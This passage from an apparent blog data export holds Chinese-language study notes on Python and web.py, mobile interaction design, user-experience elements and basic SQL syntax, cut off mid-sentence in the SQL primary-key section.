会是一个空的元组； foo(a&#x3D;100, b&#x3D;99) 和 foo(b&#x3D;99, a&#x3D;100) 是等价的，即使用关键字参数时，顺序就不重要了，可以被打乱；另外还可以固定位置和关键字组合，例如 foo( 100, b&#x3D;99, c&#x3D;98)，其中100会默认赋值给a foo(a, **b)，表示除了正常形参 a 以外，余下的参数都将组成一个字典参数传递给函数 示例： foo(100, b&#x3D;200, c&#x3D;”Hello”） print a，得到 100 print b，得到 {b:200, c:”Hello”} sys 模块包含了与 python 解释器和它的环境有关的函数 sys.path 是一个模块搜索的路径集 list，可以使用 sys.path.append(path) 添加相关的路径，但退出 python 环境后自己添加的路径将消失； string.strip([chars]) 如果参数 chars 为空，则默认裁剪删除 string 前后的空格（包括回车’&#x2F;n’，制表符’&#x2F;t’, ‘&#x2F;r’） 如果参数 chars 不为空，则裁剪删除 string 前后落在 chars 中的字符，无关乎顺序； lstrip()，只裁剪头部； tstrip()，只裁剪尾部； os.path.isdir(path) 可以用来判断路径是否为文件夹；os.path.dirname(path) 可以用来获取路径所在的文件夹；os.path 这个模块里面还有很多其他函数用来处理关于 path 的操作，点击查看 疑问： web 类除了可以有 GET 和 POST，还有哪些？ 如果要从一个文件夹中导入文件，则此文件夹需要有一个 init 的文件（空内容也行），这样这个文件夹会被视作一个包； app.run( )忘了写括号，导致没运行起来 遍历列表值 方法1： for x in list： print x 方法2： for x in range(len(list))： print list[x] 在 HTML 中给参数赋值，美元符号后面，变量名之前，需要有一个空格，正确示例 “$ a &#x3D; 10”, 错误示例 “$a &#x3D; 10” HTML，&lt;input type&#x3D;”radio” name&#x3D;”action”, value&#x3D;”render”&gt;，注意别把 value 给忘了，不然不会提交表单给服务器； 抄写示例代码时，写完后，认真核对每一行的输入有没有遗漏，非常重要！！！ 如果提示 no moduble named something，如果单词没有拼写错误且模块也存在，则有可能是没有设置环境变量造成的；环境变量的设置方法，windows下，在 powershell 中输入以下内容：$env:PYTHONPATH &#x3D; “$env:PYTHONPATH;.” 元组的操作跟列表类似，唯一的区别是元组的内容不可修改； file.readlines( )：返回的列表中，会包括 file 里面每一行末尾的回车符，如果不需要它，可以通过 strip() 将其裁剪掉； 函数可以有两种写法，一种直接改变传入的参数并返回；一种不改变传入的参数，通过新增变量来赋值并返回，感觉后者的副作用更小； 如何给POST方法做测试？1. 模拟数据提交，验证返回结果2. 怎么模拟数据提交？ 原理：url 类里面的一种方法，通过传入参数，这个函数返回相应的结果，验证结果是否符合预期 作者做了一个测试网站响应的 tool，通过调用这个工具来判断网站是否正确响应； 除此之外，是否有更好的方法？3. app.request( &#x2F;url ) 这个函数是干嘛用的？ web.py中，web.application里面的一个函数，向 applicaiton 发送路径和方法进行请求，返回结果是一个 storage 对象，里面包含有：返回数据 data，状态 status，头部信息 header；4. web.py 中的 application 类是干嘛的？ 作用：基于路径代理请求； application(self, mapping&#x3D;( ), fvars&#x3D;{ }, autoreload&#x3D;None)，其中： mapping&#x3D;( )： 是一个存有 url 与 相应类之间的映射关系的元组，例如：urls &#x3D; (“&#x2F;hello”, “Hello”)，默认初始为空 fvars&#x3D;{ }：默认初始为空的字典，这个字典存放命名空间，可以是局部的 locals( )，也可以是全局的 globals( ) 命名空间，一个很重要的概念1. 函数的命名空间 每个函数都有自己的命名空间，在这个空间里面，放着函数的参数、变量等 这个空间类似于一个对象，放在里面的东西，用键来表示，键值则对应东西的值2. 模块的命名空间 模块的命名空间跟函数一样，只是放入了更多东西，包括：模块的参数、模块的变量、模块的类、模块的函数等 对于 from module import something，它的原理是从 module 中调用 something，并放入当前的模块； 对于 import module，它的原理是调入整个 module，，因此这个 module 还保留着自己的命名空间； 对于后者，如果要访问 module 的函数，就需要加上 module 的名称作为前缀名，因为这样才能够访问到该命名空间； locals() 和 globals()：1. 作为两个内置函数，提供了访问局部命名空间和全局命名空间的方式2. 前者是只读的，后者不是；调用 locals() 时，它并没有返回命名空间，而只是返回了一个拷贝，所以对它进行操作并不影响原空间；而globals() 返回的是全局命名空间的字典，所以对它进行操作，都会对全局变量发生影响；3. 用途：使用这两个函数，通过提供变量的字符串名称，可以动态的得到任何变量的值； vars(object )1. 如果有参数，表示返回 object 的属性组成的字典，等同于 object.dict2. 如果没有参数，其作用与 locals() 相同 dir(object )1. dir() 会自动寻找一个对象的所有属性，不管它是字典还是列表，包括__dict__中的属性2. dir() 返回所找到的属性组成的列表 python 的“非”运算符使用 “not”，而不是使用感叹号“！” 据说：虽然可以随时给对象的属性赋值，但好的编程规范是将属性的初始操作都封装在 init() 中； 对于在类的主体中初始化的属性，会立即被执行，但是使用 def 关键字声明的方法，则不会被立即执行，而是等到调用时才执行； 如果通过 def 定义了一个函数，实际是在全局定义了一个变量；如果用同样的方法在类中定义一个函数，则是为这个类添加了一个属性；因此，实例的方法，实际上是在类中，而不是在实例中；当调用 类Foo 的实例 f 的方法 say() 时，实际上是调用了 Foo 的 say() 方法，并且把 f 做为第一个参数传到 say 中，因此 f.say() 和 Foo.say(f) 实际上没有本质上的区别； 在 python 中，变量和属性的寻址略有不同；变量的查询遵循 LEGB 原则，即 local, enclosing, global, builtin；属性的查找原则则是：先查找属性声明的那个对象，然后是创建对象的类，然后顺着类的继承往上找，直到 object 对象；所以可以说，python 没有实例变量和类变量的说法，只有对象和属性（因为在 python 中，一切皆对象）；但我们应该避免类属性和实例属性重名； format() 函数，用来格式化输出字符串，示例：1. 例子1： age &#x3D; 25 name &#x3D; Rudi print(‘{0} is {1} years old. ‘.format(name, age)) #输出参数 结果：Rudi is 25 years old.2. 例子2 print(‘{0:.3} is a decimal. ‘.format(1&#x2F;3)) #小数点后三位 结果：0.333 is a decimal.3. 例子3 print(‘My name is {0.name}’.format(open(‘out.txt’, ‘w’))) #调用方法 结果： My name is Rudi. 说明： 数字(0, 1, …)即代表format()里面的元素, 所以可以使用”.”调用元素的方法 如果要导入 A 文件夹中的 B 文件的 C 类，如下：1. from A.B import C2. 注意：A 和 B 使用点“.”连接，而不是斜杠“&#x2F;” web.py 里面有很多是模块，使用之前需要先导入才行，例如： from web import form，之后才能使用 form.** 来创建一些对象； 获取用户输入的选项，程序进行不同的处理，除了使用 if 来逐个判断外，更好的做法或是将选项与值组成一个字典 dict {key1:value1, key2:value2}，然后使用 dict.get(key) 来进行处理 raise 关键字有什么作用？1. 可以用来触发错误2. 还有以下用法 class Foo(object): def AA(): #处理业务逻辑 raise web.seeother(‘&#x2F;‘) session 和 cookie1. 目的：由于 http 是一个无状态协议，所以如果想达到个性化服务的效果，就需要有一种机制来识别客户端的状态；2. cookie 采取在客户端保存状态，session 采取在服务端保持状态；3. 如果是持久保存，session 的实现需要 cookie 配合；如果只是本次访问期间保存，则 session 可以通过 url 重写或者表单隐藏字段来实现； 疑问汇总1. 代码写在一个文件里，跟分开写成多个文件：什么时候使用前者，什么时候使用后者，各自的使用场景是什么？2. GET 方法，服务器返回值时，此时的值是如何存储，以及应该如何读取？ 通过 request( ) 函数向服务器发送请求，返回值是一个 storage 对象，里面带3个信息，分别是 data, header, status；可以使用 request(‘&#x2F;**’).data 来访问，返回的 data 是一个字符串；3. class, type, 的区别？ Classes are Instances of type. User-defined classes are instances of type classes. User-defined classes are types that generate instances of their own.4. 可以根据需要再加载模块吗，而不是一次性都加载进来？ 可以动态的加载模块5. web.config.get(‘_session’) 和 web.config._session 二者的区别是什么？ 前者表示获取字典 web.config 指定键 ‘_session’ 的值 后者表示访问对象 web.config 指定属性 _session 为什么 web.config 一会是字典，一会是对象呢？ 在 python 里面，一切皆是对象，因此字典也是一种对象 对象的属性储存在对象的 dict 属性中，dict 是一个字典，它的键即是属性名，键对应的值即是属性本身； 6. 点 &quot;.&quot; 操作符可以应用在哪些场景？ 1. 访问包中的模板 2. 访问模板中的函数、变量、属性 3. 访问对象内的函数、变量、属性 7. web.py 模板 template 中的 base=&quot;layout&quot; 如何使用？ 1. 详见 web.py 学习笔记中的站点布局模板 2. 原理： 1. 编写一个通用的布局模板 layout.html，base=&quot;layout.html&quot;（如果有些页面不想用，就不加这个） 2. 使用变量 content，将变量 content 放在内容区 $content，外面由模板的HTML 标签包裹 3. 还可以在 content 下面设置一些变量，通过 content.var（变量名）来访问； 错误总结1. 在类中定义的函数，至少要有一个参数self，不能没有参数；2. 取字典的键值，需要使用 get(key) 函数，而不能直接 dict.key，但可以这样 dict[key]；3. 条件判断记得用 &#x3D;&#x3D;，而不是 &#x3D;4. 思考 A 引入 B，B 引入 C，从而使用在执行A 的时候，获得了 C 的代码？待实践5. 判断 A 字符串是否包含在 B 字符串中，使用 if A in B6. 创建类的时候，记得写 (object)7. 自增是 i +&#x3D; 1；而不是 i &#x3D;+18. 在函数中与全局变量同名的变量，如果在函数中有改变此变量的值，则函数内的变量会被识别为局部变量；如果确定两个变量是一样的，则需要在函数中给变量加上 global 关键字，用来告诉解释器，此处引用了一个全局变量；9. 一行写多条语句的话，可以通过分号换行，不过不太推荐这种写法，建议一行一条语句，这样比较容易阅读10. 多行一条语句，可以通过行的末尾加“&#x2F;“ 符号来表示本行未结束 其他知识1. rsplit([sep[, maxsplit]]) rsplit 可以从右侧开始分割，因此对于获取文件名特别有用； maxsplit 可以用来指定分割次数，默认为 -1，即分割所有；若指定1，则只分割一次；2. windows powershell 输入文件结束符的方式为 ctrl + z；linux 下输入文件结束符的方式为 ctrl + d3. 偏函数：当某个函数的参数比较多时，或者其中某个参数是固定值，可以使用 functools.partial 来包装这个函数，生成一个新函数，目的是后续调用的时候更加方便，可以减少重复写固定值的参数的工作量；4. zip 函数用于将多个可迭代对象中的元素，一一配对，组成元组列表后返回；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"移动设计","slug":"移动设计","date":"2014-10-14T15:06:00.000Z","updated":"2024-09-22T23:08:43.583Z","comments":true,"path":"2014/10/14/移动设计/","permalink":"http://example.com/2014/10/14/%E7%A7%BB%E5%8A%A8%E8%AE%BE%E8%AE%A1/","excerpt":"","text":"概述 专注于用户能获取的核心价值 提供用户需要的功能 考虑如何为用户减少付出 最后思考如何吸引眼球，为用户创建良好的使用体验。 特征 使用场景：光线、噪音、使用姿态 网速特殊：分步加载、懒加载、智能加载、离线访问； 设备特征：屏幕尺寸、功能按键、传感器 触摸手势交互：点击、拖拽、滑动 原则 内容优先 为触摸而设计 转换输入方式 多通道设计 为中断而设计 流畅性 易学性 智能有爱 框架 框架目标：浅而窄 路径扁平化 层级信息合并 隐藏 导航 标签式 辐射式 列表式 平铺式 点聚式 抽屉式 扩展屏幕之外的导航：上下（左右） 细节 交互更多样 点击 拖拽和拨动 多指手势 摇晃 麦克风 摄像头 虚拟现实的界面（例如地图） 界面可视化 可视化的信息架构 内容信息的图形化 可感知的操作线索 看得见的反馈 用隐喻引导用户 拟物化降低用户认识 线索搭建隐喻系统 营造环境的隐喻 声音的互动 降低用户注意力 制造产品的使用氛围 树立品牌认识 机器间的交流 动效 作用 告诉用户应该做什么:引导页面 提醒用户将要去到哪里：页面切换 帮忙用户减少焦虑：页面加载 引领用户经历故事：情感体验 吸引用户触碰感知：感觉有趣 营造应用独有的气质：传达品牌特性 适合动效的应用场景 转场：形变、运动、无技巧转场（通过共同的元素线索） 引导： 对隐藏内容、操作的提示； 新手帮助（适时出现和离开、突出主要功能、增加新手帮助亮点） 反馈：过程反馈、结果反馈（轻量的、连续的，融入了情感的动效） 加载：最好可以结合品牌形象，给人留下更深刻的印象 如何描述一段动态效果 运动动效的基本规范 形变动效的基本规范 动效设计方法 运动形变万变不离其宗 节奏速度，掌控曲线时长 情感故事，拟物、隐喻、品牌 结合操作，关联轻量自然 点到为上，切记过犹不及 尊重习惯，谨慎进行创新 快速原型，多方沟通权衡 适配 各种屏幕尺寸的界面适配 整体缩放：首页 间距增加：九宫格导航 单向拉伸：列表 智能调整：栅格列表 延展性：启动界面 响应式布局模式 左右三列布局模式 综合布局模式 封面式布局模式 标题布局模式 导航的响应式组织 基于设备属性来组织导航 导航响应设计的几个典型架构 图片的响应式变化 文字的响应式展现 理性看待响应式 优势：开发维护运营成本优势、兼容性优势、改动灵活 缺陷：不一定很好满足移动端的用户需求、开发时间较长、加载速度加长 创新 创新技法详解 逆反法：钨丝灯泡抽气与充气 离散法：活版印刷 移植法：碰一碰，换名片（将一个对象的概念原理方法移植到另外一个对象） 还原法：以光影变化还原时间流逝的概念 强化法：Google地图的矢量图到卫星图到造影街景图，强化显示属性达到真实的效果 组合法：GPS与跑鞋产生Nike+应用 对应法：iBook的翻页效果 工具 Axure JustinMind（比Axure更适合设计移动应用，比Axure提供更为全面的手势支持和widgets控件） iPhone Mockup POP Skala Preview（Mac+iOS）：适时在手机预览电脑的设计图片效果 Android Design Preview：功能同上，用于Android平台 一份好的移动交互原型 项目概要 流程图 交互原型 交互说明 可以触摸的交互文档 流 把握用户的视觉焦点 手指的触点区域 梳理界面中的视线流 提供自然连续的操作流 视觉焦点到触点的引导流 触点到视觉焦点的反馈流","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"用户体验要素-概要","slug":"用户体验要素-概要","date":"2014-10-01T07:18:00.000Z","updated":"2024-09-22T23:08:43.583Z","comments":true,"path":"2014/10/01/用户体验要素-概要/","permalink":"http://example.com/2014/10/01/%E7%94%A8%E6%88%B7%E4%BD%93%E9%AA%8C%E8%A6%81%E7%B4%A0-%E6%A6%82%E8%A6%81/","excerpt":"","text":"方法：以用户为中心的设计 前言：如何提出正确的问题 在开发产品的每一个步骤中，都要把用户列入考虑范围 考虑用户的体验，把它分解成各个组成要素，从不同角度来了解它 5个层面 表现层：网页，由图片和文字组成 框架层：按钮、控件、图片和文字的位置 结构层：用户如何到达某个页面，做完事情之后能去什么地方 范围层：网站提供什么功能 战略层：用户想从网站得到什么，经营者想从网站得到什么 2种产品 功能性平台产品 信息型媒介产品 5个要素 战略层：用户需求、产品目标； 范围层：功能规格、内容需求； 结构层：交互设计（系统如何响应用户的需求），信息架构（合理安排内容元素以促进人类理解信息） 框架层：信息设计（促进信息理解的表达方式）、界面设计（如何让用户与系统的功能产生互动的元素）、导航设计（允许用户在信息架构中穿行） 表现层：为最终产品创建感知体验 战略层 应该询问自己的两个问题： 我们想通过这个产品得到什么?(产品目标） 我们的用户想通过这个产品得到什么？（用户需求） 成功标准：我们怎样才知道这个产品是否已经成功？一些可追踪的指标 用户需求：首先定义谁是我们的客户 用户细分：消费心态档案 可用性和用户研究：问卷调查、焦点小组、现场访谈、现场测试等 创建用户角色 范围层 目的：知道自己在建设什么，知道自己不需要建设什么 功能需求规格清单：定义需求 功能需求规格说明：写下来的规则– 乐观：描述系统将要做什么事情以防止不好的事情发生； 具体：尽可能详细的解释清楚情况，这是我们决定一个功能能否被实现的最佳途径； 避免使用主观的用词和语气； 确认功能的优先级：留意那些看上去有可能需要改变战略的特性建议。 结构层 以功能建设为主：交互设计–关注于将影响用户执行和完成任务的元素；关注于描述“可能的用户行为“，同时定义”系统如何配合和响应“这些用户行为； 以内容建设为主：信息架构–关注于如何将信息表达给用户的元素； 概念模型：拟物，降低用户学习成本 错误处理：首先–设计成不可能犯错；其次–设计成难以犯错；最后–设计成可以撤销； 框架层 界面设计：提供用户做某些事的能力； 选择正确的界面元素，让用户一眼就看到最重要的东西； 这个界面第一次呈现给用户的时候，仔细考虑每个选项的默认值；或者自动记住用户最后一次选择状态； 导航设计：提供用户去某个地方的能力； 三个目标 提供给用户一种在网站间跳转的方法； 传达出元素和它们所包含内容的关系； 传达出内容和当前浏览网页之间的关系； 全局导航、局部导航、辅助导航、上下文导航、友好导航、网站地图、索引表等； 信息设计：传达某个想法给用户；最关键的，是用一种能“反映用户的思路”和“支持他们的任务和目标”的方式来分类和排列这些信息元素。 线框图：如果有交互设计、线框设计和视觉设计多个分工的话，最好的办法是协作制作线框图，互相站在对方的角度思考问题。 表现层：解决产品框架层的逻辑排布的感知呈现问题 忠于眼睛：我们想让用户在界面上面完成什么？我们的视觉设计有没有配合这个目标去引导用户的眼球和注意力？ 对比：吸引用户眼球注意力的一个主要工具； 内部一致性和外部一致性； 配色：一般来说，更亮的用于前景色，用于吸引更多的注意力；暗淡的用于不需要跳出页面的背景元素中； 排版：因为文本会被花较长时间阅读，因此字体简单就好，不容易引起疲劳； 要素的应用 创造良好用户体验的最重要工作内容是大量收集亟待解决的非常细微的问题； 了解你正在试着去解决的问题； 了解这些解决办法所造成的后果； 你为什么要这么做？将每一个决定都建立在其背后议题的理解之上。 比用户更了解他们的需求；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"SQL","slug":"SQL","date":"2014-04-15T03:55:00.000Z","updated":"2024-09-22T04:00:06.593Z","comments":true,"path":"2014/04/15/SQL/","permalink":"http://example.com/2014/04/15/SQL/","excerpt":"","text":"简介 structure query language, 结构化查询语言，用于访问和处理数据库 用途 查询 取数 插入新记录 更新记录 删除记录 创建数据库 创建新表 创建存储过程 类似于函数，可接收参数 好处：更快，更安全，可复用 创建视图 类似于虚拟表，由一个或多个基表组成，对表的一种抽象 好处 可实现应用程序和表之间的解耦，尽量减少一边的变动对另外一边的影响 更方便实现权限的控制 设置表、存储过程、视图的权限 语法 说明 SQL 对大小写不敏感； 每条 SQL 语句之间，有些数据库需要使用分号分隔，有些不需要 SQL 可以分成两部分，DML 和 DDL DML，数据操作语言 SELECT, 从数据库中选择数据 UPDATE，更新数据库中的数据 DELETE，删除数据库中的数据 INSERT INTO，向数据库插入数据 DDL， 数据定义语言 CREATE DATABASE，创建新数据库 ALTER DATABASE, 修改数据库 CREATE TABLE，创建新表 ALTER TABLE, 修改表 DROP TABLE，删除表 CREATE INDEX，创建索引（搜索键） DROP INDEX，删除索引 SQL SELECT 语句 用于从表中选取数据，结果被存储在一个结果表中（结果集） 语法 SELECT 列名称 FROM 表名称 SELECT 列名称1, 列名称2 FROM 表名称 SELECT * FROM 表名称（注：* 号表示所有列） SQL SELECT DISTINCT 语句 从表中选择数据后，返回唯一不同的值，即去掉重复项 语法 SELECT DISTINCT 列名称 FROM 表名称 SQL WHERE 子句 从表中有条件的选取数据 语法 SELECT 列名称 FROM 表名称 WHERE 列 运算符 值 运算符 &#x3D;，等于 &lt;&gt;，不等于（某些版本可用 !&#x3D;） ，大于 &lt;，小于 &#x3D;，大于等于 &lt;&#x3D;，小于等于 BETWEEN，在某个范围内 LIKE，搜索某种模式？ 例子 SELECT 列名称 FROM 表名称 WHERE city&#x3D;’Beijing’ city 是表中某一列的名称 由于 Beijing 是字符串，所以使用引号，如果是数值，则不需要用引号 SQL AND &amp; OR 运算符 用于两个或以上的条件对记录进行过滤 条件1 AND 条件2，需要满足两个条件 条件1 OR 条件2，只需要满足其中一个条件 示例 SELECT * FROM Persons WHERE FirstName&#x3D;’Thomas’ AND LastName&#x3D;’Carter’ SELECT * FROM Persons WHERE FirstName&#x3D;’Thomas’ OR LastName&#x3D;’Carter’ 也可以将两个运算符结合起来，使用圆括号来组成复杂的表达式 SELECT * FROM Persons WHERE (FirstName&#x3D;’Thomas’ OR FirstName&#x3D;’William’) AND LastName&#x3D;’Carter’ SQL ORDER BY 子句 用于对结果集进行排序，默认升序（ASC），降序用 DESC 示例 SELECT Company, OrderNumber FROM Orders ORDER BY Company SELECT Company, OrderNumber FROM Orders ORDER BY Company, OrderNumber SELECT Company, OrderNumber FROM Orders ORDER BY Company DESC SELECT Company, OrderNumber FROM Orders ORDER BY Company DESC, OrderNumber ASC SQL INSERT INTO 语句 用于向表中插入新行 语法 INSERT INTO 表名称 VALUES （值1，值2，……） INSERT INTO 表名称 （列1，列2，……） VALUES （值1， 值2，……） 指定要插入数据的列 示例 INSERT INTO Persons VALUES (‘Gates’, ‘Bill’, ‘Xuanwumen 10’, ‘Beijing’) INSERT INTO Persons (LastName, Address) VALUES (‘Wison’, ‘Champs-Elysees’) SQL UPDATE 语句 用于修改表中的数据 语法 UPDATE 表名称 SET 列名称 &#x3D; 新值 WHERE 列名称 &#x3D; 某值 示例 UPDATE Persons SET FirstName&#x3D;’Fred’ WHERE LastName&#x3D;’Wilson’ 更新一行中的一个列 UPDATE Persons SET Address&#x3D;’Zhongshan 23’, City&#x3D;’Nanjing’ WHERE LastName&#x3D;’Wilson’ 更新一行中的多个列 SQL DELETE 语句 用于删除表中的行 语法 DELETE FROM 表名称 WHERE 列名称&#x3D;某值 示例 删除某行 DELETE FROM Person WHERE LastName&#x3D;’Wilson’ 删除所有行（不删除表的情况下） DELETE FROM 表名称 DELETE * FROM 表名称 SQL TOP 子句 用于设定要返回的记录的数目（如果表很大，可能只需要返回部分） 语法 SELECT TOP 数字（或百分比） FROM 表名称 不同数据库此语法可能略有不同，不是所在数据库都支持 TOP 语法 示例 MySQL SELECT * FROM Persons LIMIT 5 Oracle SELECT * FROM Persons WHERE ROWNUM &lt;&#x3D;5 SQL SELECT TOP 2 * FROM Persons SELECT TOP 50 PERCENT * FROM Persons SQL LIKE 操作符 用于在 WHERE 子句中搜索列中的指定模式 语法 SELECT 列名称 FROM 表名称 WHERE 列名称 LIKE 模式 示例 选择城市以”N”开头的记录 SELECT * FROM Persons WHERE City LIKE ‘N%’ 选择城市以”g”结尾的记录 SELECT * FROM Persons WHERE City LIKE ‘%g’ 选择城市包含”lon”的记录 SELECT * FROM Persons WHERE City LIKE ‘%lon%’ 选择城市中不包含’lon’的记录（使用 NOT LIKE） SELECT * FROM Persons WHERE City NOT LIKE ‘%lon%’ SQL 通配符 在搜索数据库中的数据时，可以使用 SQL 通配符 通配符可以用来代替一个或者多个字符，通配符必须与 LIKE 运算符一起使用 “%”，替代一个或者多个字符 “_”，替代一个字符 [charlist]，字符列中的任何单一字符 [^charlist] 或者 [!charlist] ，不在字符列中的任何单一字符 示例 以任意一个字符开头，后面接着’eorge’ SELECT * FROM Persons WHERE FirstName LIKE ‘_eorge’ 以 C 开头，后面接着 r，再接任意字符，最后以 er 结尾 SELECT * FROM Persons WHERE FirstName LIKE ‘C_r%er’ 选取城市以A、L、N 开头 SELECT * FROM Persons WHERE City LIKE ‘[ALN]%’ 选取城市不以A、L、N 开头 SELECT * FROM Persons WHERE City LIKE ‘[!ALN]%’ SQL IN 操作符 用于在 WHERE 子句中规定多个值 语法 SELECT 列名称 FROM 表名称 WHERE 列名称 IN （值1，值2，……） 示例 SELECT * FROM Persons WHERE LastName IN (‘Adams’, ‘Carter’) SQL BETWEEN 操作符 用在 WHERE 子句，用于选取两个值之间的数据范围 语法 SELECT 列名称 FROM 表名称 WHERE 列名称 BETWEEN 值1 AND 值2 不同的数据库对 BETWEEN…AND… 的理解不同，有些包括前后，有些只前无后，有些不包括前后 可以使用 NOT BETWEEN … AND … 来选取范围之外的数据； 示例 SELECT * FROM Persons WHERE LastName BETWEEN ‘Adams’ AND ‘Carter’ SQL Alias 别名 AS 可以用来为列名称或表名称指定别名，目的是让 SQL 容易阅读和书写（通过将语句重复出现的单词用简称来替代） 语法 SELECT 列名称 FROM 表名称 AS 表别名 SELECT 列名称 AS 列别名 FROM 表名称 示例 表名称别名 SELECT po.OrderID, p.LastName, p.FirstName FROM Persons AS p, Product_Orders AS po WHERE p.LastName&#x3D;’Adams’ AND p.FirstName&#x3D;’John’ 列名称别名 SELECT FirstName AS FAMILY, LastName AS NAME FROM Persons 在出来的结果集中，原列名称 FirstName 和 LastName 会分别显示为别名 FAMILY 和 NAME SQL JOIN 用于从两个或者多个表中查询数据 语法 SELECT 列1，列2，… FROM 表1 INNER JOIN 表2 ON 列1&#x3D;列2 取两个表的交集 SELECT 列1，列2，…FROM 表1 LEFT JOIN 表2 ON 列1&#x3D;列2（有些数据库叫 LEFT OUTER JOIN） 取表1的完全集，如果表2中没有对应值，则默认NULL SELECT 列1，列2，…FROM 表1 RIGHT JOIN 表2 ON 列1&#x3D;列2 （有些数据库叫 RIGHT OUTER JOIN） 取表2的完全集，如果表1中没有对应值，则默认NULL SELECT 列1，列2，…FROM 表1 FULL JOIN 表2 ON 列1&#x3D;列2 （有些数据库叫 FULL OUTER JOIN） 取两个表的并集，包括两个表的全部行，不管有没有对应值，没有则默认NULL SELECT 列1，列2，…FROM 表1 CROSS JOIN 表2 取两个表的笛卡尔乘积，表1*表2的集合，慎用 示例 INNER JOIN，交集，两个表都需要匹配 SELECT Persons.LastName, Persons.FirstName, Orders.OrderNo FROM Persons INNER JOIN Orders ON Persons.Id_P&#x3D;Orders.Id_P ORDER BY Persons.LastName LEFT JOIN，左表所有行，右表有匹配行则返回右表值，没有匹配行则返回NULL SELECT Persons.LastName, Persons.FirstName, Orders.OrderNo FROM Persons LEFT JOIN Orders ON Persons.Id_P&#x3D;Orders.Id_p ORDER BY Persons.LastName RIGHT JOIN, 右表所有行，左表有匹配行则返回左表值，没有匹配行则返回NULL SELECT Persons.LastName, Persons.FirstName, Orders.OrderNo FROM Persons RIGHT JOIN Orders ON Persons.Id_P&#x3D;Orders.Id_P ORDER BY Persons.LastName FULL JOIN，则要其中某个匹配存在，则返回行，没有值默认NULL SELECT Persons.LastName, Persons.FirstName, Orders.OrderNo FROM Persons FULL JOIN Orders ON Persons.Id_P&#x3D;Orders.Id_P ORDER BY Persons.LastName 说明 可以通过增加条件，如 WHERE 列名称&#x3D;某值 来对结果集进一步筛选 SQL UNION 合并两个或多个 SELECT 语句的结果集 UNION，会去除重复的行 UNION ALL，不会去重，展示所有 两个 SELECT 语句必须有相同数量的列，列的数据类型相同，列的顺序相同 语法 SELECT 列名称 FROM 表1 UNION SELECT 列名称 FROM 表2 示例 SELECT E_Name FROM Employees_China UNION SELECT E_Name FROM Employees_USA SQL SELECT INTO 用于从一个表中选取数据，插入到另外一个表中（可以是在另外的数据库） 语法 复制一个列或者多个列 SELECT 列名称 INTO 表名称2 FROM 表名称1 示例：SELECT * INTO new_table_name FROM old_table_name 插入到另外数据库 SELECT 列名称 INTO 表名称2 IN 数据库2 FROM 表名称1 示例：SELECT * INTO Persons IN ‘Backup.mdb’ FROM Persons 可以增加 WHERE 子句 示例：SELECT LastName, FirstName INTO Persons_Backup FROM Persons WHERE City&#x3D;’Beijing’ 可以使用 JOIN 连接多个表 示例：SELECT Persons.LastName, Orders.OrderNo INTO Persons_Order_Backup FROM Persons INNER JOIN Orders ON Persons.Id_P&#x3D;Orders.Id_P CREATE DATABASE 创建数据库 语法 CREATE DATABASE 数据库名 示例 CREATE DATABASE my_db CREATE TABLE 创建表 语法 CREATEA TABLE 表名称 （ 列名称1 数据类型1， 列名称2 数据类型2， 列名称3 数据类型3， ） 数据类型 integer(size), int(size), smallint(size), tinyint(size) 仅容纳整数，size 用来设定最大位数 decimal(size, d), numeric(size,d) 容纳带有小数的数字，size 用来设定数据的最大位数，d 设置小数点后的最大位数 char(size) 容纳字符串（可容纳字母、数字及特殊字符） size 设定字符串的最大长度 varchar(size) 容纳可变长度的字符串 size 设定字符串的最大长度 date(yyyymmdd) 容纳日期 示例 CREATE TABLE Persons ( Id_P int, LastName varchar(255), FirstName varchar(255), Address varchar(255), City varchar(255) ) SQL Contrains 约束，用来约束限制加入表的数据的类型 NOT NULL UNIQUE PRIMARY KEY FOREIGN KEY CHECK DEFAULT SQL NOT NULL 约束不接受空值，即如果没有值，则无法向表中插入数据 示例 CREATE TABLE Persons ( Id_P int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255) ) SQL UNIQUE 约束唯一标识表中的每条记录 UNIQUE 和 PRIMARY KEY 都可以用来保证唯一性 一个表可以有多个 UNIQUE 约束，但只可以有一个PRIMARY KEY 示例 MySQL CREATE TABLE Persons ( Id_P int NOT NULL, LastName varchar(255) NOT NULL FirstName varchar(255), Address varchar(255), City varchar(255), UNIQUE (Id_P) ) SQL Server &#x2F; Oracle &#x2F; MS Access CREATE TABLE Persons ( Id_P int NOT NULL UNIQUE, LastName varchar(255) NOT NULL FirstName varchar(255), Address varchar(255), City varchar(255) ) 如果需要约束多个唯一标识 UNIQUE (Id_P) 更改为 UNIQUE (Id_P, LastName) 如果需要给约束命名， 语法： CONSTRAINT 约束名称 UNIQUE 列名称 示例 CONSTRAINT uc_PersonID UNIQUE (Id_P, LastName) 如果想要在表被创建后，再补上约束，可以使用 ALTER 语法 ALTER TABLE 表名 ADD UNIQUE （列名称） 示例 ALTER TABLE Persons ADD UNIQUE (Id_P) 如果要撤销 UNIQUE MySQL 语法 ALTER TABLE 表名 DROP INDEX 约束名称 示例 ALTER TABLE Persons DROP INDEX uc_PersonID SQL Server &#x2F; Oracle &#x2F; MS Access 语法 ALTER TABLE 表名 DROP CONSTRAINT 约束名称 示例 ALTER TABLE Persons DROP CONSTRAINT uc_PersonID SQL PRIMARY KEY 约束 PRIMARY KEY 约束唯一标识表的记录，一个表必须有一个 PRIMARY KEY，也只能有一个，PRIMARY KEY 不能为空，且值需要是唯一的 创建主键 MySQL 语法 PRIMARY KEY 列名称 示例 CREATE TABLE Persons ( Id_P int NOT NULL, FirstName varchar(255), LastName varchar(255), PRIMARY KEY (Id_P) ) SQL Server &#x2F; Oracle &#x2F; MS Access 语法 列名称 值类型 PRIMARY KEY 示例 CREATE TABLE Persons ( Id_P int NOT NULL PRIMARY KEY, FristName varchar(255) ) 如果需要给主键命名,MySQL &#x2F; SQL Server &#x2F; Oracle &#x2F; MS Access 都一样 语法 